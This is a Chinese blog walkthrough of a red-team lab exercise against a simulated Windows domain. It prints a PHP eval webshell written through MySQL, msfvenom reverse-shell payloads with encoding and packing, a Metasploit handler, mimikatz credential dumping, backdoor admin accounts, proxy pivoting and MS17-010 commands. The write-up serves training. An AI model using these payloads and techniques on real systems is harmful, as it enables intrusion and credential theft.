---
title: vulnstack内网靶场(一)保姆级教程
author: Troy3e
avatar: 'https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/QQ%E5%9B%BE%E7%89%8720210427144151.jpg'
authorAbout: SteamID：888007034
authorDesc: Blizzard：TroyeSivan#51769
categories: 技术
comments: true
date: 2021-06-03 14:03:51
authorLink:
tags:
keywords:
description:
photos: https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1145960.png
---
断断续续挖了几周的洞了，有一说一要比CTF简单得多，虽然交上去有效的不多。
然后我发现一个问题，那就是我根本不会内网。CTF里面极少出现内网渗透，基本都是绕过读flag或者绕过getshell这种。所以在去实习前还需要学一下内网的知识。今天在安全客逛街的时候看到了这个红日安全团队的vulnstack靶场，来学习一下。
网上看了看都是很简略的教程，而这个靶场配置的时候确实有很多要注意的地方，那我就来写个保姆级教程吧。
链接：http://vulnstack.qiyuanxuetang.net/vuln/

## 环境搭建
http://vulnstack.qiyuanxuetang.net/vuln/detail/2/
首先嫖一个百度云vip账号把环境下载下来。

拓扑图如下：

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210601155944.png)

下载好以后设置一下网络（模拟内网外网

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210601165156.png)

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210601165217.png)

192.168.52.0/24为模拟内网环境。（Vmnet1）
192.168.72.0/24为模拟公网环境。（Vmnet2）
攻击者机器与win7的第一张网卡处于Vmnet1。（模拟公网）
win7的另一张网卡与win2k3、win2k8处于Vmnet2。（模拟内网）
一定注意这里不能把公网内网弄反了，下面直接上图：
kali（攻击机：

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210603123657.png)

Windows7 x64：（重点！！！这里必须是上面VMnet1，下面VMnet2，不能弄反！！！

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210603123740.png)

剩下的两个按上面方式设置为 VMnet1 即可。

<b>接下来是重点，那就是win7的配置</b>
首先进去用给的密码hongrisec@2019登录。然而进去之后你会发现phpstudy打开报错，啥都干不了。
原因可能是目前这个账号的问题，我的解决方案：https://jingyan.baidu.com/article/37bce2be193fd51003f3a259.html

照做之后，再次登录的地方选择切换账号，输入god\administrator即可登进一开始的账号，密码是你上面自己设置的。
登进去之后在c盘找到phpstudy启动即可。
测试：

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210603125549.png)

ping通说明就没问题了。

## 外网渗透
首先是信息收集，使用kali自带的Netdiscover扫一下C段

    netdiscover -i eth0 -r 192.168.72.0/24
    -i 选择监控的网卡
    -r 指定ip段

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210603131547.png)

nmap扫端口

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210603131719.png)

访问80端口

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210603131736.png)

一个phpstudy探针，在下面有个测试连接数据库，这里下意识想到构造mysql恶意服务器读取任意文件，用自己vps试了下然而忘记现在是不出网的。。。
尝试本地服务器弱口令root root ，显示连接正常。
dirsearch扫一遍

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210601205500.png)

这里图里的ip是错的，用的之前的图懒得改了，懂得都懂。
dir太垃圾了漏了个源码beifen.rar，手动加上。
在备份文件里找到后台

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210601211804.png)
可以直接登后台getshell，比较简单就不弄了。
转phpadmin，利用弱口令登录。
一、into outfile写木马
条件：
1、对web目录需要有写权限能够使用单引号
2、知道绝对路径
3、没有配置secure-file-priv(限制文件传到指定目录)（注意是没有，不是NULL）

    show globals variables like 'secure%'

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210601212907.png)

写马：
    
    select '<?php @eval($_POST[111]);?>' into outfile 'C:/phpStudy/WWW/yxcms/troy3e.php'
当然这里是NULL是不行的（无法动态修改），所以得换另一种方法。

二、利用日志文件getshell

    set global general_log='on'

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210601220415.png)

看一下日志路径，现在所有执行的sql语句都会出现在stu1.log。
但是这个值是可以修改的，我们把它改成php：

    set global general_log_file='C:/phpStudy/WWW/yxcms/public/troy3e.php'

现在执行包含一句话木马语句：
    
    select '<?php @eval($_POST[111]);?>'

蚁剑

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210603131915.png)

## 反弹一个MSF的shell

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210602205143.png)

    msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.52.128 lport=8888 -f exe -o win.exe  #lhost是我们的主机ip，lport是我们主机的用于监听的端口
 
    msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.52.128 lport=8888 -i 3 -e x86/shikata_ga_nai  -f exe -o win.exe  #编码3次

还可以upx加个壳防溯源：
    
    upx -9 win.exe -k -o win2.exe

我这里win10试了下还是被杀了。
然后打开msfconsole：

    msf > use exploit/multi/handler  #使用exploit/multi/handler监听从肉鸡发来的数据
    msf exploit(handler) > set payload windows/meterpreter/reverse_tcp  #设置payload，不同的木马设置不同的payload
    msf exploit(handler) > set lhost 192.168.72.129  #我们的主机ip
    msf exploit(handler) > set lport 8888            #我们的主机端口
    msf exploit(handler) > exploit 

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210602210244.png)

执行msf马

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210602210607.png)

由于这里进来直接是管理员用户，所以直接能提到system

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210602211028.png)

## 派生CobaltStrike权限

用CS获取权限和msf没啥区别，这里主要提一下把msf的shell转发到CS上。
首先CS上开个监听，CS咋用我好像发了一篇博客了。

    use exploit/windows/local/payload_inject
    set payload windows/meterpreter/reverse_http
    set DisablePayloadHandler true   #默认情况下，payload_inject执行之后会在本地产生一个新的handler，由于我们已经有了一个，所以不需要在产生一个，所以这里我们设置为true
    set lhost xxxx                 #cobaltstrike监听的ip
    set lport 14444                 #cobaltstrike监听的端口 
    set session 1                   #这里是获得的session的id
    exploit

由于我搭的环境没法出网，就不上图了。

## 获取账号密码
重新进入刚刚的shell
 
    sessions -l 查看所有获得的session
    sessions -i 1 进入
1、导出hash：

    run hashdump

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210602213143.png)

或者

    run windows/gather/smart_hashdump

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210602213305.png)

2、加载kiwi模块

    load kiwi

使用kiwi模块需要system权限，所以我们在使用该模块之前需要将当前MSF中的shell提升为system。提到system有两个方法，一是当前的权限是administrator用户，二是利用其它手段先提权到administrator用户。然后administrator用户可以直接getsystem到system权限。

    creds_all：列举所有凭据
    creds_kerberos：列举所有kerberos凭据
    creds_msv：列举所有msv凭据
    creds_ssp：列举所有ssp凭据
    creds_tspkg：列举所有tspkg凭据
    creds_wdigest：列举所有wdigest凭据
    dcsync：通过DCSync检索用户帐户信息
    dcsync_ntlm：通过DCSync检索用户帐户NTLM散列、SID和RID
    golden_ticket_create：创建黄金票据
    kerberos_ticket_list：列举kerberos票据
    kerberos_ticket_purge：清除kerberos票据
    kerberos_ticket_use：使用kerberos票据
    kiwi_cmd：执行mimikatz的命令，后面接mimikatz.exe的命令
    lsa_dump_sam：dump出lsa的SAM
    lsa_dump_secrets：dump出lsa的密文
    password_change：修改密码
    wifi_list：列出当前用户的wifi配置文件
    wifi_list_shared：列出共享wifi配置文件/编码

    creds_all

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210602213835.png)

失败。

3、加载mimikatz模块

加载mimikatz模块首先需要将msf迁移到64位的进程里
ps看一下进程随便进一个

migrate 352

由于mimikatz已被kiwi吞并，所以直接：

    kiwi_cmd sekurlsa::logonpasswords

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210602215539.png)

得到密码。

## 远程桌面
（注意这下面图里的ip也是错的，之前写的了，不过问题不大，懂得都懂。
一般情况下并不建议使用管理员账户来远程，因为这样会将管理员挤下线，暴露自己的行动。
所以我们新建一个用户：

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210602220227.png)

麻了
把自己加到管理员组

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210602220423.png)

一开始记得没扫出来3389端口，这里再试一次

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210602220652.png)

果然，大概是被过滤了。再次打开万能的msf

    run post/windows/manage/enable_rdp

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210602221536.png)

报错了。
手动开启也没成，估计是进程的原因？

重新执行一遍木马（因为我这里进到低权限进程跳不回去了
换个别的进程，成功：

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210602223909.png)

    rdesktop 192.168.52.143

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210602224117.png)

然后拿我们刚刚注册的新用户登进去就行。

## 添加路由、挂Socks5代理
添加路由的目的是为了让我们的MSF其他模块能访问内网的其他主机
添加socks4a代理的目的是为了让其他软件更方便的访问到内网的其他主机的服务

在使用代理之前，我们需要先添加路由，让MSF能到达目标机器内网。因为这里socks模块只是将代理设置为监听的端口(默认是1080),即通过proxychains的流量都转给本地的1080端口，又因为这是MSF起的监听端口，所以通过代理走的流量也都能到达内网。

1、添加路由

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210603143811.png)

添加内网路由 run autoroute -s 192.168.52.0/24

    route add 0.0.0.0 0.0.0.0 1 注意先background
    route print

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210602225017.png)

2、搭建Socks4a代理

    use auxiliary/server/socks_proxy
    set version 4a
    set SRVHOST  0.0.0.0 //这两个默认，没特殊需求其实不用填
    set SRVPORT  1080
    //set USERNAME root
    //set PASSWORD Password@
    run

然后修改/etc/proxychains.conf
在最后一行添加

    socks4 127.0.0.1 1080 //若前面设置了用户名密码这里跟上即可

测试：

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210603150037.png)

注意！！！这里是内网的ip！！！是52不是72。
打通。接下来就可以用msf模块、nmap、fscan这类工具对内网进行信息收集。
当然也可以指向我们的vps，但是实战建议使用frp。

## 域信息收集

    net time /domain        #查看时间服务器
    net user /domain        #查看域用户
    net view /domain        #查看有几个域
    net group "domain computers" /domain         #查看域内所有的主机名
    net group "domain admins"   /domain          #查看域管理员
    net group "domain controllers" /domain       #查看域控

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210603132620.png)

由此可见我们现在就是域管理员权限。

## 拿下域成员主机

按上面步骤设置好了代理，就可以用工具进行信息收集了

    proxychains nmap -p 0-1000 -Pn -sT 192.168.52.141

因为这nmap扫的实在是太慢了，就不放图了。。。

使用msf辅助模块进行扫描，查看是否存在ms17-010漏洞

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210603151346.png)

三个都可能存在。
使用msf的代理之后就不能使用反向shell了，我们需要使用正向shell。

    use auxiliary/admin/smb/ms17_010_command
    show options
    set RHOSTS 192.168.52.141
    set command net user Troy3e !@#123qwe!@# /add #添加用户
    run #成功执行
    set command net localgroup administrators Troy3e /add #管理员权限
    run #成功执行
    set command 'REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f'
    run #成功执行

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210603151826.png)

使用proxychains连接    proxychains rdesktop 192.168.52.141

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210603154318.png)

 然后使用exploit/windows/smb/ms17_010_psexec 尝试去打一个shell回来

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210603154603.png)

打了十几次都没通，放弃了。网上也说这个成功率很低，主要还是2003的原因。

## 拿下域控
在前面我们已经拿到了域用户的帐号密码，即administrator、HONGRISEC@2019我们现在要做的就是如何登录到域控上去
定位到域控制器的ip为192.168.52.138
还是先利用smb扫描系统版本   auxiliary/scanner/smb/smb_version

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210603155318.png)

ms17_010_psexec失败

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210603160549.png)

换MS08-067

___________
后面试了好多模块都不行，不知道原因，这里就列几种可以用的吧，已经打了太长时间吃不消了：

    MS17-010
    CVE-2019-0708
    psexec攻击
    哈希传递攻击
    MS14-068

哈希传递攻击可以一试。